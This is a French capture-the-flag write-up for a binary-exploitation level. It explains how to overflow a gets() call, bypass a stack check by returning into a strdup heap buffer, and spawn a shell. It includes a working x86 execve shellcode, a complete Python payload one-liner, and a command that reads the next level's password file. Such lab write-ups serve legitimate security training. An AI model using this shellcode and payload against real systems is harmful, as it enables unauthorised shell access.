
# Level2
---
###### Étape 1 : -- Décompiler le programme --

En décompilant le programme avec Dogbolt ou Ghidra, on voit dans le programme deux fonctions. P et Main : 

On voit par la suite que dans la fonction P il y a la fonction __gets__ qui est appelé.

 - on utilisera cette fonction pour overflow le programme.

On voit aussi que le programme check juste apres le __gets__ si la stack à été alterée. 
ce qui nous empèche d'écrire directement sur l'addresse de retour de __gets__.

Plus loin dans le progamme on observe la fonction __strdup__ qui elle n'a pas de vérification de stack.
- on utilisera le retour de cette fonction pour executer un shellcode qui lancera un terminal bash nous permetant d'accéder au prochain level.

###### Étape 2: -- Overflow --

Depuis __GDB__, on cherche où ce situe la limite de la fonction __gets__, ce qui nous permet de calculer un _offset_ qui nous permetra d'overflow la fonction. On obtient un offset de ==80==.

Ensuite nous cherchons l'adresse de retour de la fonction __strdup__ avec la fonction __ltrace__. Obtient l'adresse ==0x0804a008==


shellcode: ==\x6a\x0b\x58\x99\x52\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x31\xc9\xcd\x80==


###### Étape 3: -- Execution --

Avec offset, le shellcode et l'addresse de retour, on crée un one-liner python pour executer un payload donnant accès à un terminal bash.

Contruction du payload: 
> (python - c 'print "[shellcode]" + "A" * [offset - len(shellcode)] + "[return address]"[::-1]'; cat -) | ./binary

Payload final :
```bash
(python -c 'print "\x6a\x0b\x58\x99\x52\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x31\xc9\xcd\x80" + "A" * 59 + "\x08\xa0\x04\x08"'; cat -) |./level2
```

Dans le terminal on execute la commande suivante pour récupérer le password du level3:

```bash
cat /home/user/level3/.pass
```